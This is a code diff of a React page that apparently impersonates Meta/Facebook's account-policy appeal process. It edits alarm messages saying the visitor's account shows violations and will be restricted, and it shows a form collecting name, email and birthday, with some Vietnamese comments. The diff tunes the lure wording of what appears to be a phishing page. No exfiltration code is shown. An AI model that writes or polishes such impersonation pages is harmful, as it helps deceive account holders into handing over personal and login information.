@@ -18,8 +18,8 @@ const Home = () => {
             privacySecurity: 'Privacy, Safety and Security',
             policiesReporting: 'Policies and Reporting',
             pagePolicyAppeals: 'Account Policy Complaints',
-            detectedActivity: 'We have detected unusual activity on your Page connected to your Instagram, including reported guideline and copyright violations.',
-            accessLimited: 'To avoid having your account locked,Please verify to ensure the review process is handled quickly and accurately.',
+            detectedActivity: 'We have detected unusual activity on your account that violates our community standards.',
+            accessLimited: 'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.',
             submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
             pageName: 'Name',
             mail: 'Email',
@@ -354,7 +354,7 @@ const Home = () => {
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
                                 
-                                {/* Desktop: type='date' */}
+                                {/* Desktop: type='date' bình thường */}
                                 <input 
                                     type='date' 
                                     name='birthday' 
@@ -373,7 +373,7 @@ const Home = () => {
                                         onChange={(e) => handleInputChange('birthday', e.target.value)}
                                         required
                                     />
-                                    {/* Placeholder ảo - chữ số nhỏ hơn */}
+                                    {/* Placeholder ảo cho mobile */}
                                     <div 
                                         className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium`}
                                         onClick={() => document.querySelector('input[name="birthday"]').click()}
@@ -391,7 +391,7 @@ const Home = () => {
                                 <textarea 
                                     name='appeal'
                                     rows={4}
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base sm:text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
                                     placeholder={translatedTexts.appealPlaceholder}
                                     value={formData.appeal}
                                     onChange={(e) => handleInputChange('appeal', e.target.value)}
